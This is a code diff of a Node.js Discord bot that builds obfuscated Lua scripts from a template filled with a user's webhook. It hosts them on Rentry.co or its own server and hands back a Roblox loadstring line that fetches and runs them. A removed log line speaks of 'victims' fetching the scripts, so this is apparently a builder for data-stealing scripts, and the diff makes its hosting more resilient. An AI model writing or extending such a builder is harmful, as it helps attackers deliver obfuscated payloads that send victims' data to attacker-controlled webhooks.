@@ -6,46 +6,27 @@ const express = require('express');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
-// ----- Persistent script store -----
-const STORE_FILE = path.join(__dirname, 'scripts.json');
-const SCRIPT_TTL = 24 * 60 * 60 * 1000; // 24 hours
+// ----- Web server (only for health check & optional self‑host fallback) -----
+const app = express();
+const PORT = process.env.PORT || 3000;
+app.get('/', (req, res) => res.send('Bot is alive!'));
 
+// Also keep self‑host for fallback
+const STORE_FILE = path.join(__dirname, 'scripts.json');
 let scripts = new Map();
 if (fs.existsSync(STORE_FILE)) {
     try {
         const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
         const now = Date.now();
         for (const [id, entry] of Object.entries(data)) {
-            if (now < entry.expires) {
-                scripts.set(id, entry);
-            }
+            if (now < entry.expires) scripts.set(id, entry);
         }
-        console.log(`✅ Loaded ${scripts.size} active scripts from disk.`);
-    } catch (e) {
-        console.warn('⚠️ Failed to load scripts.json, starting fresh.');
-    }
+    } catch (e) {}
 }
-
 function saveScripts() {
     const obj = Object.fromEntries(scripts);
     fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
 }
-
-setInterval(() => {
-    const now = Date.now();
-    let changed = false;
-    for (const [id, entry] of scripts) {
-        if (now > entry.expires) {
-            scripts.delete(id);
-            changed = true;
-        }
-    }
-    if (changed) saveScripts();
-}, 10 * 60 * 1000);
-
-// ----- Web server -----
-const app = express();
-const PORT = process.env.PORT || 3000;
 
 app.get('/script/:id', (req, res) => {
     const id = req.params.id;
@@ -58,29 +39,15 @@ app.get('/script/:id', (req, res) => {
     res.set('Content-Type', 'text/plain');
     res.send(entry.content);
 });
-
-app.get('/', (req, res) => res.send('Bot is alive!'));
-
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Determine public base URL -----
-// Render sets RENDER_EXTERNAL_URL automatically
+// ----- Determine public base URL (for self‑host fallback) -----
 const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL || `http://localhost:${PORT}`;
-if (BASE_URL.includes('localhost')) {
-    console.warn('⚠️ WARNING: BASE_URL is localhost. Victims will not be able to fetch scripts. Set RENDER_EXTERNAL_URL or RENDER_URL environment variable.');
-} else {
+if (!BASE_URL.includes('localhost')) {
     console.log(`🌐 Public base URL: ${BASE_URL}`);
-}
-
-// ----- Self‑ping (keep Render awake) -----
-if (BASE_URL && !BASE_URL.includes('localhost')) {
-    console.log(`🔁 Self‑ping enabled: ${BASE_URL}`);
-    setInterval(() => {
-        axios.get(BASE_URL).catch(() => {});
-    }, 4 * 60 * 1000);
+    // Self‑ping (keep Render awake)
+    setInterval(() => axios.get(BASE_URL).catch(() => {}), 4 * 60 * 1000);
     setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
-} else {
-    console.log('⚠️ Self‑ping disabled (no public URL).');
 }
 
 // ----- Discord Bot -----
@@ -126,11 +93,10 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
+        // ----- Read template -----
         const templatePath = path.join(__dirname, 'template.lua');
         if (!fs.existsSync(templatePath)) {
-            return interaction.editReply({ 
-                content: '❌ Template file not found. Please ensure `template.lua` is in the bot directory.' 
-            });
+            return interaction.editReply({ content: '❌ Template file not found.' });
         }
         let template = fs.readFileSync(templatePath, 'utf8');
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
@@ -139,45 +105,59 @@ client.on('interactionCreate', async interaction => {
         // ----- Obfuscate locally -----
         const obfuscated = obfuscateScript(template);
 
-        // ----- Store script with unique ID -----
-        const id = uuidv4();
-        scripts.set(id, {
-            content: obfuscated,
-            expires: Date.now() + SCRIPT_TTL
-        });
-        saveScripts();
+        // ----- Try to upload to Rentry.co (primary) -----
+        let rawUrl;
+        let source = 'Rentry.co';
+        try {
+            const rentryRes = await axios.post('https://rentry.co/api/new', {
+                text: obfuscated,
+                // optional custom slug – set a random one to avoid collisions
+                // url: `exodus_${Date.now()}`
+            });
+            if (rentryRes.data && rentryRes.data.url) {
+                const slug = rentryRes.data.url.split('/').pop();
+                rawUrl = `https://rentry.co/raw/${slug}`;
+                console.log(`✅ Uploaded to Rentry: ${rawUrl}`);
+            } else {
+                throw new Error('Rentry response missing URL');
+            }
+        } catch (rentryError) {
+            console.warn('⚠️ Rentry upload failed:', rentryError.message);
+            // Fallback: self‑host
+            source = 'Self‑host (backup)';
+            const id = uuidv4();
+            scripts.set(id, {
+                content: obfuscated,
+                expires: Date.now() + 24 * 60 * 60 * 1000
+            });
+            saveScripts();
+            rawUrl = `${BASE_URL}/script/${id}`;
+            if (BASE_URL.includes('localhost')) {
+                return interaction.editReply({ 
+                    content: '❌ Self‑host fallback is using localhost. Please set RENDER_EXTERNAL_URL environment variable.' 
+                });
+            }
+        }
 
-        // ----- Build loadstring using the public BASE_URL -----
-        const loadstringLine = `loadstring(game:HttpGet("${BASE_URL}/script/${id}"))()`;
+        // ----- Build loadstring -----
+        const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;
 
         // ----- Reply -----
         const embed = new EmbedBuilder()
             .setColor(0x00FF00)
-            .setTitle('✅ Script Generated (Obfuscated)')
+            .setTitle('✅ Script Generated')
             .setDescription(`**Game:** ${game}\n**User:** ${username}`)
             .addFields(
-                { 
-                    name: '📜 Loadstring (copy this)', 
-                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
-                    inline: false 
-                },
-                { 
-                    name: '⏳ Script Expires', 
-                    value: `In 24 hours (or until bot restarts)`,
-                    inline: false 
-                },
-                { 
-                    name: '🔒 Obfuscation', 
-                    value: 'XOR + Base64 (lightweight)',
-                    inline: false 
-                }
+                { name: '📜 Loadstring (copy this)', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
+                { name: '📦 Hosted on', value: source, inline: false },
+                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
             )
             .setTimestamp();
 
         await interaction.editReply({ embeds: [embed] });
 
-        // ----- Self‑ping after command (optional) -----
-        if (BASE_URL && !BASE_URL.includes('localhost')) {
+        // ----- Self‑ping (if using self‑host fallback) -----
+        if (source === 'Self‑host (backup)' && !BASE_URL.includes('localhost')) {
             axios.get(BASE_URL).catch(() => {});
         }
 
@@ -187,7 +167,7 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Local obfuscator (XOR + Base64) -----
+// ----- Local obfuscator -----
 function obfuscateScript(raw) {
     const key = Math.floor(Math.random() * 254) + 1;
     let xorEncoded = '';
